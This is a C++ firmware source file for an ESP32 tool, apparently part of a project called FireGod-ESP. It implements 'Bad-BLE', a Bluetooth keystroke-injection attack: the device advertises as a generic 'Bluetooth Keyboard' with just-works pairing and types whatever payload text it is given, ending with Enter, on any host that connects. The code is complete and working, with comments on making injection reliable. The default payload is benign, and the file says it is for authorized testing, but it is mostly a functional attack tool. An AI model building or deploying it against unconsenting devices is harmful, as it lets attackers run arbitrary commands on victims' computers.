// ============================================================
// FireGod-ESP — Bad-BLE (BLE HID keyboard injection)
//
// Brings up a NimBLE HID keyboard (just-works pairing) and advertises as
// a Bluetooth keyboard. When a target connects, it types the supplied
// text (US-ASCII -> HID usage codes) and presses ENTER. WiFi SoftAP keeps
// running via coexistence. NimBLE is fully deinited on stop.
//
// HID report map is the standard 8-byte boot keyboard descriptor.
// Authorized testing on devices you own / are permitted to assess only.
// ============================================================

#include "bad_ble.h"
#include "fg_globals.h"
#include <NimBLEDevice.h>
#include <NimBLEHIDDevice.h>

// Standard 8-byte boot keyboard report descriptor (modifier, reserved, 6 keys).
// Report ID 1 (0x85,0x01) MUST be present: getInputReport(1) writes a Report
// Reference descriptor declaring ID 1, and the host drops notifications whose
// report map has no matching ID — the "connects but never types" failure.
static const uint8_t REPORT_MAP[] = {
    0x05, 0x01,        // Usage Page (Generic Desktop)
    0x09, 0x06,        // Usage (Keyboard)
    0xA1, 0x01,        // Collection (Application)
    0x85, 0x01,        //   Report ID (1)
    0x05, 0x07,        //   Usage Page (Key Codes)
    0x19, 0xE0, 0x29, 0xE7,   // Usage Min/Max (modifier keys)
    0x15, 0x00, 0x25, 0x01,   // Logical Min/Max (0..1)
    0x75, 0x01, 0x95, 0x08,   // Report Size 1, Count 8
    0x81, 0x02,        //   Input (Data,Var,Abs) — modifier byte
    0x95, 0x01, 0x75, 0x08,   // Report Count 1, Size 8
    0x81, 0x03,        //   Input (Const) — reserved byte
    0x95, 0x06, 0x75, 0x08,   // Report Count 6, Size 8
    0x15, 0x00, 0x25, 0x65,   // Logical Min/Max (0..101)
    0x05, 0x07,        //   Usage Page (Key Codes)
    0x19, 0x00, 0x29, 0x65,   // Usage Min/Max (0..101)
    0x81, 0x00,        //   Input (Data,Array) — 6 key slots
    0xC0               // End Collection
};

static NimBLEHIDDevice*      s_hid = nullptr;
static NimBLECharacteristic* s_input = nullptr;
static volatile bool         s_connected = false;
static volatile bool         s_subscribed = false;   // host enabled notifications on the input report

// Fires when the host writes the input-report CCCD. We must not type before
// this: notify() to an unsubscribed characteristic is silently dropped, which
// is why a fixed post-connect delay loses the keystrokes on a cold reconnect.
class FGInputCB : public NimBLECharacteristicCallbacks {
    void onSubscribe(NimBLECharacteristic*, NimBLEConnInfo&, uint16_t subValue) override {
        s_subscribed = (subValue & 0x0001) != 0;   // bit0 = notifications enabled
    }
};
static FGInputCB s_inputcb;

// Map an ASCII char to (modifier, HID usage). Returns false if unsupported.
static bool ascii_to_hid(char c, uint8_t& mod, uint8_t& key) {
    mod = 0; key = 0;
    if (c >= 'a' && c <= 'z') { key = 0x04 + (c - 'a'); return true; }
    if (c >= 'A' && c <= 'Z') { mod = 0x02; key = 0x04 + (c - 'A'); return true; }
    if (c >= '1' && c <= '9') { key = 0x1e + (c - '1'); return true; }
    switch (c) {
        case '0': key = 0x27; return true;
        case ' ': key = 0x2c; return true;
        case '\n': key = 0x28; return true;   // Enter
        case '\t': key = 0x2b; return true;
        case '-': key = 0x2d; return true;
        case '=': key = 0x2e; return true;
        case '[': key = 0x2f; return true;
        case ']': key = 0x30; return true;
        case '\\': key = 0x31; return true;
        case ';': key = 0x33; return true;
        case '\'': key = 0x34; return true;
        case '`': key = 0x35; return true;
        case ',': key = 0x36; return true;
        case '.': key = 0x37; return true;
        case '/': key = 0x38; return true;
        // shifted symbols
        case '!': mod = 0x02; key = 0x1e; return true;
        case '@': mod = 0x02; key = 0x1f; return true;
        case '#': mod = 0x02; key = 0x20; return true;
        case '$': mod = 0x02; key = 0x21; return true;
        case '%': mod = 0x02; key = 0x22; return true;
        case '^': mod = 0x02; key = 0x23; return true;
        case '&': mod = 0x02; key = 0x24; return true;
        case '*': mod = 0x02; key = 0x25; return true;
        case '(': mod = 0x02; key = 0x26; return true;
        case ')': mod = 0x02; key = 0x27; return true;
        case '_': mod = 0x02; key = 0x2d; return true;
        case '+': mod = 0x02; key = 0x2e; return true;
        case '{': mod = 0x02; key = 0x2f; return true;
        case '}': mod = 0x02; key = 0x30; return true;
        case '|': mod = 0x02; key = 0x31; return true;
        case ':': mod = 0x02; key = 0x33; return true;
        case '"': mod = 0x02; key = 0x34; return true;
        case '~': mod = 0x02; key = 0x35; return true;
        case '<': mod = 0x02; key = 0x36; return true;
        case '>': mod = 0x02; key = 0x37; return true;
        case '?': mod = 0x02; key = 0x38; return true;
    }
    return false;
}

static void send_report(uint8_t mod, uint8_t key) {
    uint8_t rpt[8] = { mod, 0, key, 0, 0, 0, 0, 0 };
    s_input->setValue(rpt, 8);
    s_input->notify();
    vTaskDelay(pdMS_TO_TICKS(8));
    uint8_t up[8] = { 0, 0, 0, 0, 0, 0, 0, 0 };   // key release
    s_input->setValue(up, 8);
    s_input->notify();
    vTaskDelay(pdMS_TO_TICKS(8));
}

static void type_text(const char* text) {
    for (const char* p = text; *p && !g_stopRequested; p++) {
        uint8_t mod, key;
        if (ascii_to_hid(*p, mod, key)) send_report(mod, key);
    }
    if (!g_stopRequested) send_report(0, 0x28);   // trailing Enter
}

class FGSrvCB : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer*, NimBLEConnInfo&) override {
        s_connected = true;
        fg_send_result("{\"event\":\"log\",\"msg\":\"Bad-BLE: target connected\"}");
    }
    void onDisconnect(NimBLEServer*, NimBLEConnInfo&, int) override {
        s_connected = false;
        s_subscribed = false;
        fg_send_result("{\"event\":\"log\",\"msg\":\"Bad-BLE: target disconnected\"}");
        // Re-advertise so a fresh target can connect; skip if we're tearing down.
        if (!g_stopRequested) NimBLEDevice::getAdvertising()->start();
    }
};
static FGSrvCB s_srvcb;

void fg_bad_ble(const char* text) {
    const char* payload = (text && text[0]) ? text
        : "FireGod-ESP authorized BLE HID test";
    s_connected = false;

    fg_send_result("{\"event\":\"log\",\"msg\":\"Bad-BLE: advertising as keyboard...\"}");
    Serial.printf("[BLE] Bad-BLE payload: %s\n", payload);

    NimBLEDevice::init("Bluetooth Keyboard");
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);         // reset (ble_spam leaves RANDOM)
    NimBLEDevice::setSecurityAuth(true, false, true);          // bond, no MITM, SC
    NimBLEDevice::setSecurityIOCap(BLE_HS_IO_NO_INPUT_OUTPUT);  // just-works

    NimBLEServer* server = NimBLEDevice::createServer();
    server->setCallbacks(&s_srvcb, false);   // false = don't delete our static cb on deinit

    s_hid = new NimBLEHIDDevice(server);
    s_input = s_hid->getInputReport(1);
    s_input->setCallbacks(&s_inputcb);   // watch for the host enabling notifications
    s_hid->setManufacturer("FireGod");
    s_hid->setPnp(0x02, 0xe502, 0xa111, 0x0210);
    s_hid->setHidInfo(0x00, 0x01);
    s_hid->setReportMap((uint8_t*)REPORT_MAP, sizeof(REPORT_MAP));
    s_hid->startServices();
    s_hid->setBatteryLevel(100);

    NimBLEAdvertising* adv = NimBLEDevice::getAdvertising();
    adv->setName("Bluetooth Keyboard");                        // shown in scan lists
    adv->setAppearance(0x03C1);                                // HID keyboard
    adv->addServiceUUID(s_hid->getHidService()->getUUID());
    adv->enableScanResponse(true);                             // name overflows into scan resp
    adv->start();

    bool typed = false;
    while (!g_stopRequested) {
        vTaskDelay(pdMS_TO_TICKS(100));
        // Type once the host has actually subscribed to the input report — not on
        // a fixed timer, which races the encryption + CCCD-write on reconnects.
        if (s_connected && s_subscribed && !typed) {
            vTaskDelay(pdMS_TO_TICKS(300));    // brief settle after subscription
            if (s_connected && s_subscribed) {
                fg_send_result("{\"event\":\"log\",\"msg\":\"Bad-BLE: typing payload\"}");
                type_text(payload);
                fg_send_result("{\"event\":\"log\",\"msg\":\"Bad-BLE: payload sent\"}");
                typed = true;
            }
        }
    }

    NimBLEDevice::stopAdvertising();
    NimBLEDevice::deinit(true);
    delete s_hid;                 // wrapper struct (its services are owned/freed by the server)
    s_hid = nullptr;
    s_input = nullptr;

    fg_send_result("{\"event\":\"scan_complete\",\"type\":\"bad_ble\",\"count\":1}");
    Serial.println("[BLE] Bad-BLE stopped.");
}